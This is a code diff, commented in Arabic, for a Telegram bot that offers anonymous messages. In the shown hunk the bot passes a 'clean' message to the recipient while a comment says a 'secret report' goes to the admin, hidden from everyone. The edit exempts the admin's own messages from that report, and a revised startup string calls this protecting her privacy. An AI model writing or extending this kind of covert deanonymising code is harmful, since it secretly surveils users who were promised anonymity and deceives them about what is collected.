@@ -128,8 +128,8 @@ def handle_anonymous_routing(message):
         # إرسال الرسالة لصاحب الرابط (نظيفة وبدون بيانات)
         bot.send_message(chat_id=target_id, text=clean_msg_for_owner, parse_mode="Markdown")
         
-        # إرسال التقرير السري لكِ أنتِ فوراً وبشكل مخفي عن الجميع
-        if target_id != ADMIN_ID: # إذا ما كانت الرسالة موجهة إلك أصلاً، ارسلي نسخة تقرير
+        # 🔥 تعديل الأمان: التقرير يرسل فقط إذا كان المرسل شخصاً آخر غيركِ أنتِ (ADMIN_ID)
+        if target_id != ADMIN_ID and sender_id != ADMIN_ID:
             bot.send_message(chat_id=ADMIN_ID, text=spy_report_for_admin, reply_markup=markup, parse_mode="Markdown")
         
         # طمأنة المرسِل في شاته
@@ -194,5 +194,5 @@ if __name__ == "__main__":
         pass
         
     threading.Thread(target=run_dummy_server, daemon=True).start()
-    print("🕵️‍♀️ البوت يعمل الآن بنظامك الأصلي 100% مع زر الحظر التفاعلي...")
+    print("🕵️‍♀️ البوت يعمل الآن بنظامك الأصلي مع حماية خصوصيتك عند الإرسال...")
     bot.infinity_polling()
